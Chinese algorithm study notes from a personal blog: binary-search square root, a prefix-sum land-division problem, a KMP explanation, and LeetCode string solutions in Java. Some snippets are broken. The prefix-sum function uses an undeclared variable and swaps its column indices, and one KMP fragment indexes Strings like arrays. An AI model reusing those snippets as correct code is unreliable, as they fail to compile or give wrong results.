<h3 id="二分法-X的算术平方根"><a href="#二分法-X的算术平方根" class="headerlink" title="(二分法) X的算术平方根"></a>(二分法) X的算术平方根</h3><p>给你一个非负整数x，计算并返回x的算术平方根。由于返回类型是整数，结果只保留整数部分，小数部分将被舍去。注意：不允许使用任何内置指数函数和算符，例如pow(x,0.5)或者x**0.5。</p>
<p>示例：<br>输入：x &#x3D; 4<br>输出：2</p>
<p>思路：</p>
<ol>
<li>使用<code>二分法</code>，左闭右闭区间，因此循环条件应该是<code>left&lt;=right</code>；因为向下取整，因此<code>&lt;=</code>时，此时的median可能就是答案，记录此值。</li>
<li><code>袖珍计算器算法</code>是一种用指数函数 exp 和对数函数 ln 代替平方根函数的方法。我们通过有限的可以使用的数学函数，得到我们想要计算的结果。我们将x写成幂的形式 x1&#x2F;2，再使用自然对数e进行换底，即可得到.这样我们就可以得到 x的值了<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240909223320.png"></li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方法1 二分法</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">mySqrt</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = x,answer =-<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">median</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="type">long</span>)(median) * (median) &lt;= x) &#123;</span><br><span class="line">            answer = median;</span><br><span class="line">            left = median+<span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            right= median-<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> answer;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 方法2</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">mySqrt</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (x == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> (<span class="type">int</span>) Math.exp(<span class="number">0.5</span> * Math.log(x));</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">long</span>) (ans + <span class="number">1</span>) * (ans + <span class="number">1</span>) &lt;= x ? ans + <span class="number">1</span> : ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>































<h3 id="前缀和-开发商分配"><a href="#前缀和-开发商分配" class="headerlink" title="(前缀和) 开发商分配"></a>(前缀和) 开发商分配</h3><p>在一个城市区域内，被划分成了n * m个连续的区块，每个区块都拥有不同的权值，代表着其土地价值。目前，有两家开发公司，A 公司和 B 公司，希望购买这个城市区域的土地。现在，需要将这个城市区域的所有区块分配给 A 公司和 B 公司。然而，由于城市规划的限制，只允许将区域按横向或纵向划分成两个子区域，而且每个子区域都必须包含一个或多个区块。为了确保公平竞争，你需要找到一种分配方式，使得 A 公司和 B 公司各自的子区域内的土地总价值之差最小。输入时首先输入两个数字，分别代表n、m；之后输入n行m列数字。输出为两个子区域内土地总价值之间的最小差距</p>
<p>示例：<br>输入:3 3 \n 1 2 3 \n 2 1 3 \n 1 2 3<br>输出:0。</p>
<p>思路：利用浅醉和，先求和后减</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">dividedSolution</span><span class="params">(<span class="type">int</span>[][] vec, <span class="type">int</span> n, <span class="type">int</span> m)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">                sum += vec[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">                count += vec[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">            result = Math.min(result, Math.abs(sum - <span class="number">2</span> * count));</span><br><span class="line">        &#125;</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">                count += vec[j][i];</span><br><span class="line">            &#125;</span><br><span class="line">            result = Math.min(result, Math.abs(sum - <span class="number">2</span> * count));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><h2 id="常用算法-1"><a href="#常用算法-1" class="headerlink" title="常用算法"></a>常用算法</h2><h3 id="KMP算法详解"><a href="#KMP算法详解" class="headerlink" title="KMP算法详解"></a>KMP算法详解</h3><p>太TM傻逼了怎么会有这么难理解的算法</p>
<p>文本串：aabaabaaf<br>模式串：aabaaf</p>
<p><strong>KMP算法的作用</strong></p>
<p>KMP主要应用在字符串匹配上。<br>KMP的主要思想是当出现字符串不匹配时，可以知道一部分之前已经匹配的文本内容，可以利用这些信息避免从头再去做匹配了。所以如何记录已经匹配的文本内容，是KMP的重点，也是next数组肩负的重任。</p>
<p><strong>前缀表</strong></p>
<p>前缀：指不包含最后一个字符的所有以第一个字符开头的连续子串。<br>    <strong>下文中指 以字符串首字符为开头，包含其后若干字符但不包含下标i对应字符的（当前字符串的）子串</strong><br>后缀：指不包含第一个字符的所有以最后一个字符结尾的连续子串。<br>    <strong>下文中指 以下标i对应字符为结尾，包含其前若干字符但不包含字符串首字符的（当前字符串的）子串</strong><br>如，针对aabaa，对于最后一个a，其下标为4，那么<br>后缀可以是(斜体部分): aaba<em>a</em>、aab<em>aa</em>、aa<em>baa</em>、a<em>abaa</em><br>前缀可以是(斜体部分): <em>a</em>abaa、<em>aa</em>baa、<em>aab</em>aa、<em>aaba</em>a、<br>最长相等前后缀是：2 即<em>aa</em></p>
<p>前缀表：<strong>记录下标i和i之前的字符串中，有多大长度的后缀和前缀</strong>。<br>前缀表的任务是当前位置匹配失败，找到之前已经匹配上的位置，再重新匹配，此也意味着在某个字符失配时，前缀表会告诉你下一步匹配中，模式串应该跳到哪个位置。</p>
<p>文本串：aabaabaaf<br>模式串：aabaaf<br>前缀表：010120</p>
<p>aabaacaad<br>010120120</p>
<p><strong>思考</strong>：当匹配到f时我们发现其与文本串不相符，由f的前一个元素对应前缀表数据2可以知道，文本串匹配到与f不相同字符b时，其前方的字符至少和模式串的前2个相同，那么我们接下来只需要匹配当前文本串中字符b是否与模式串中第3个也就是下标为2的字符是否相同；不同再重复上述步骤，即可充分利用已经匹配的部分。</p>
<p>next数组可以是前缀表，但是很多实现都是把前缀表统一减一（右移一位，初始位置为-1）之后作为next数组。</p>
<p><strong>构造next数组(前缀表)</strong></p>
<p>每次求next[i]，可看作前缀与后缀的一次匹配，在该过程中就可以用上之前所求的next，若匹配失败，则像模式串与父串匹配一样，将指针移到next[j-1]上。<br>构造next数组其实就是计算模式串s前缀表的过程。 主要有如下三步：</p>
<ol>
<li>初始化:<ul>
<li><strong>使用<code>j</code>指向前缀末尾位置，其值也就等于最长相等前后缀值</strong></li>
<li>第一个字符对应的 最长相等前后缀的值 应为<code>0</code>（或<code>-1</code>，取决于具体实现），因此 <code>j=0</code>;</li>
<li>初始化<code>next</code>数组，从下标为<code>1</code>的字符开始计算前缀值，因此 <code>i=1</code>；即<code>开始时有j+1=i</code></li>
<li>下标为<code>0</code>的字符（第一个字符）直接初始化<code>0</code>（或<code>-1</code>），因此<code>next[0]=0</code>;</li>
</ul>
</li>
<li>处理前后缀不相同的情况<ul>
<li><code>next[j]</code>就是记录着<code>j</code>（包括<code>j</code>）之前的子串的相同前后缀的长度。</li>
<li>那么<code>s[i]</code>与 <code>s[j]</code> 不相同，代表此次前后缀不相同，就要找<code>j</code>前一个元素在<code>next</code>数组里的值（就是<code>next[j-1]</code>）</li>
<li>如上文中 <code>i</code>指向<code>f</code>时，其与<code>j</code>指向的<code>b</code>不同，因此我们把<code>j=next[j-1]</code>，判断<code>f</code>(后缀最后一个字符)是否与前缀的最后一个字符(即下标为<code>1</code>的字符)相同(已经确认前缀后缀除最后一个字符外均相同)，明显不同，再重复。</li>
</ul>
</li>
<li>处理前后缀相同的情况<ul>
<li>如果<code>s[i]</code>与<code>s[j]</code>相同(<code>i</code>前<code>j-1</code>个字符即<code>i</code>前一个字符为结尾的后缀 和<code>j</code>前的<code>j-1</code>个字符即以首字符为开头<code>j</code>前一个字符为结尾的前缀(<code>0~j-1</code>的对应字符)相同)，那么就同时向后移动<code>i</code>和<code>j</code>说明找到了相同的前后缀。</li>
<li>同时还要将j（前缀的长度）赋给next[i], 因为next[i]要记录相同前后缀的长度。</li>
</ul>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getNext</span><span class="params">(<span class="type">int</span>[] next, String s)</span> &#123;</span><br><span class="line">    <span class="comment">// 初始化</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    next[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">        <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; s.charAt(j) != s.charAt(i)) </span><br><span class="line">            j = next[j - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (s.charAt(j) == s.charAt(i)) </span><br><span class="line">            j++;</span><br><span class="line">        next[i] = j; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>使用next数组来做匹配</strong></p>
<p>在文本串s里找是否出现过模式串t。</p>
<ol>
<li>定义两个下标，j指向模式串起始位置，i指向文本串起始位置。</li>
<li>j初始值依然为0，（因为next数组里记录的起始位置为0）。i从0开始，遍历文本串</li>
<li>接下来比较 s[i]和t[j]:<ul>
<li>如果s[i]与t[j]不相同，<code>j</code>就要从<code>next</code>数组里寻找下一个匹配的位置(next[j-1])。</li>
<li>如果s[i]与t[j] 相同，那么<code>i</code>和<code>j</code>同时向后移动，</li>
</ul>
</li>
<li>如果<code>j</code>指向了模式串<code>t</code>的末尾，那么就说明模式串<code>t</code>完全匹配文本串<code>s</code>里的某个子串了。</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">// 因为next数组里记录的起始位置为0</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length(); i++) &#123; <span class="comment">// 注意i就从0开始</span></span><br><span class="line">    <span class="keyword">while</span>(j &gt; <span class="number">0</span> &amp;&amp; s[i] != t[j]) &#123; <span class="comment">// 不匹配</span></span><br><span class="line">        j = next[j-<span class="number">1</span>]; <span class="comment">// j 寻找之前匹配的位置</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (s[i] == t[j]) &#123; <span class="comment">// 匹配，j和i同时向后移动</span></span><br><span class="line">        j++; <span class="comment">// i的增加在for循环里</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (j == (t.length())) &#123; <span class="comment">// 文本串s里出现了模式串t</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="重要题解-1"><a href="#重要题解-1" class="headerlink" title="重要题解"></a>重要题解</h2><h3 id="344-翻转字符串"><a href="#344-翻转字符串" class="headerlink" title="344 翻转字符串"></a>344 翻转字符串</h3><p>主要思路：左右向中间逼近更容易写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverseString</span><span class="params">(<span class="type">char</span>[] s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> s.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">            s[l] ^= s[r];  <span class="comment">//构造 a ^ b 的结果，并放在 a 中</span></span><br><span class="line">            s[r] ^= s[l];  <span class="comment">//将 a ^ b 这一结果再 ^ b ，存入b中，此时 b = a, a = a ^ b</span></span><br><span class="line">            s[l] ^= s[r];  <span class="comment">//a ^ b 的结果再 ^ a ，存入 a 中，此时 b = a, a = b 完成交换</span></span><br><span class="line">            l++;</span><br><span class="line">            r--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二种方法用temp来交换数值更多人容易理解些</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverseString</span><span class="params">(<span class="type">char</span>[] s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> s.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(l &lt; r)&#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">temp</span> <span class="operator">=</span> s[l];</span><br><span class="line">            s[l] = s[r];</span><br><span class="line">            s[r] = temp;</span><br><span class="line">            l++;</span><br><span class="line">            r--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="541-翻转字符串2"><a href="#541-翻转字符串2" class="headerlink" title="541 翻转字符串2"></a>541 翻转字符串2</h3><p>给定一个字符串 s 和一个整数 k，从字符串开头算起，每计数至 2k 个字符，就反转这 2k 字符中的前 k 个字符。<br>如果剩余字符少于 k 个，则将剩余字符全部反转。<br>如果剩余字符小于 2k 但大于或等于 k 个，则反转前 k 个字符，其余字符保持原样。</p>
<p>主要思路：i每次增加2k更快</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">reverseStr</span><span class="params">(String s, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">    <span class="type">char</span>[] chars = s.toCharArray();</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,l,r,len = chars.length;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;len)&#123;</span><br><span class="line">        l = i;</span><br><span class="line">        r = Math.min(len-<span class="number">1</span>,i+k-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">while</span>(l&lt;r)&#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">temp</span> <span class="operator">=</span>  chars[l];</span><br><span class="line">            chars[l] =  chars[r];</span><br><span class="line">            chars[r] = temp;</span><br><span class="line">            l++;</span><br><span class="line">            r--;</span><br><span class="line">        &#125;</span><br><span class="line">        i+=<span class="number">2</span>*k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(chars);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="KMP算法-28-子字符串匹配"><a href="#KMP算法-28-子字符串匹配" class="headerlink" title="(KMP算法) 28 子字符串匹配"></a>(KMP算法) 28 子字符串匹配</h3><p>题目：给你两个字符串 haystack 和 needle ，请你在 haystack 字符串中找出 needle 字符串的第一个匹配项的下标（下标从 0 开始）。如果 needle 不是 haystack 的一部分，则返回 -1 。</p>
<p>示例：<br>输入：haystack:sadbutsad    needle:sad<br>输出：0</p>
<p>思路：</p>
<ol>
<li>暴力破解法：外循环遍历haystack，若匹配到haystack中第i个字符，与needle第一个字符相同，进入内循环，遍历needle，判断needle的第j个与haystack的第i+j个是否相同，复杂度为O(n<code>*</code>m)，空间O(1)</li>
<li>KMP算法 ，复杂度为O(n<code>+</code>m)，空间O(1)</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// kmp</span></span><br><span class="line"><span class="comment">// TO(n+m) SO(m)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">strStr</span><span class="params">(String haystack, String needle)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> haystack.length(), m = needle.length();</span><br><span class="line">        <span class="keyword">if</span> (m == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] pi = <span class="keyword">new</span> <span class="title class_">int</span>[m];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>, j = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; needle.charAt(i) != needle.charAt(j)) &#123;</span><br><span class="line">                j = pi[j - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (needle.charAt(i) == needle.charAt(j)) &#123;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            pi[i] = j;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, j = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; haystack.charAt(i) != needle.charAt(j)) &#123;</span><br><span class="line">                j = pi[j - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (haystack.charAt(i) == needle.charAt(j)) &#123;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (j == m) &#123;</span><br><span class="line">                <span class="keyword">return</span> i - m + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="其他题解-1"><a href="#其他题解-1" class="headerlink" title="其他题解"></a>其他题解</h2><h3 id="14-字符串最长公共前缀"><a href="#14-字符串最长公共前缀" class="headerlink" title="14 字符串最长公共前缀"></a>14 字符串最长公共前缀</h3><p>题目：编写一个函数来查找字符串数组中的最长公共前缀。如果不存在公共前缀，返回空字符串 “”。<br><strong>只是前缀</strong></p>
<p>示例：<br>输入：strs &#x3D; [“flower”,”flow”,”flight”]<br>输出：”fl”</p>
<p>思路：将第0个字符串作为起始相同字符串，从第一个字符串开始遍历字符串数组，比对其中相同的前缀字符数，更新相同字符串。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">longestCommonPrefix</span><span class="params">(String[] strs)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (strs == <span class="literal">null</span> || strs.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">prefix</span> <span class="operator">=</span> strs[<span class="number">0</span>];</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> strs.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; count; i++) &#123;</span><br><span class="line">        prefix = longestCommonPrefix(prefix, strs[i]);</span><br><span class="line">        <span class="keyword">if</span> (prefix.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> prefix;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">longestCommonPrefix</span><span class="params">(String str1, String str2)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> Math.min(str1.length(), str2.length());</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (index &lt; length &amp;&amp; str1.charAt(index) == str2.charAt(index)) &#123;</span><br><span class="line">        index++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str1.substring(<span class="number">0</span>, index);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="151-反转字符串中的单词"><a href="#151-反转字符串中的单词" class="headerlink" title="151 反转字符串中的单词"></a>151 反转字符串中的单词</h3><p>给你一个字符串 s ，请你反转字符串中 单词 的顺序。单词 是由非空格字符组成的字符串。s 中使用至少一个空格将字符串中的 单词 分隔开。返回 单词 顺序颠倒且 单词 之间用单个空格连接的结果字符串。<br>注意：输入字符串 s中可能会存在前导空格、尾随空格或者单词间的多个空格。返回的结果字符串中，单词间应当仅用单个空格分隔，且不包含任何额外的空格。</p>
<p>输入：s &#x3D; “a good example”<br>输出：”example good a”</p>
<p>思路：两种方法</p>
<ol>
<li>反转全部字符，再逐个单词反转，去除多余空格</li>
<li>新建字符数组，从最后一个单词开始复制</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//方法2</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">reverseWords</span><span class="params">(String s)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">lenght</span> <span class="operator">=</span> s.length();</span><br><span class="line">    <span class="type">char</span>[] rawStrings = s.toCharArray();</span><br><span class="line">    <span class="type">char</span>[] newStrings = <span class="keyword">new</span> <span class="title class_">char</span>[lenght + <span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> <span class="variable">tailToHead</span> <span class="operator">=</span> lenght - <span class="number">1</span>, newStrNum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (tailToHead &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (tailToHead &gt;= <span class="number">0</span> &amp;&amp; rawStrings[tailToHead] == <span class="string">&#x27; &#x27;</span> ) &#123;</span><br><span class="line">            tailToHead--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> tailToHead;</span><br><span class="line">        <span class="keyword">while</span> (tailToHead &gt;= <span class="number">0</span> &amp;&amp; rawStrings[tailToHead] != <span class="string">&#x27; &#x27;</span> ) &#123;</span><br><span class="line">            tailToHead--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> tailToHead + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (start &lt;= end) &#123;</span><br><span class="line">            newStrings[newStrNum++] = rawStrings[start++];</span><br><span class="line">            <span class="keyword">if</span> (start &gt; end) &#123;</span><br><span class="line">                newStrings[newStrNum++] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (newStrNum == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(newStrings, <span class="number">0</span>, newStrNum - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="459-重复的子字符串"><a href="#459-重复的子字符串" class="headerlink" title="459 重复的子字符串"></a>459 重复的子字符串</h3><p>给定一个非空的字符串 s ，检查是否可以通过由它的一个子串重复多次构成。</p>
<p>示例:<br>输入: s &#x3D; “abab”<br>输出: true</p>
<p>思路：</p>
<ol>
<li>kmp算法求出next，若next[len-1]为0，则必为false;若为重复子串构成，则len必能整除以(len-next[len-1])(单个子字符串的长度)</li>
<li>移位法：新字符串等于两个相同的原字符串拼接，然后去掉首尾字符，若仍然含有原字符串，说明由重复子字符串构成</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">repeatedSubstringPattern</span><span class="params">(String s)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>[] next = <span class="keyword">new</span> <span class="title class_">int</span>[s.length()];</span><br><span class="line">    next[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;s.length();i++)&#123;</span><br><span class="line">        <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; s.charAt(j) != s.charAt(i)) &#123;</span><br><span class="line">            j = next[j - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s.charAt(j)==s.charAt(i)) &#123;</span><br><span class="line">            next[i] =++j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> s.length(),index = len-<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> next[index] != <span class="number">0</span> &amp;&amp; len % (len - next[index]) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>设计模式与算法</category>
        <category>算法</category>
      </categories>
      <tags>
        <tag>数组算法</tag>
        <tag>字符串算法</tag>
      </tags>
  </entry>
</search>
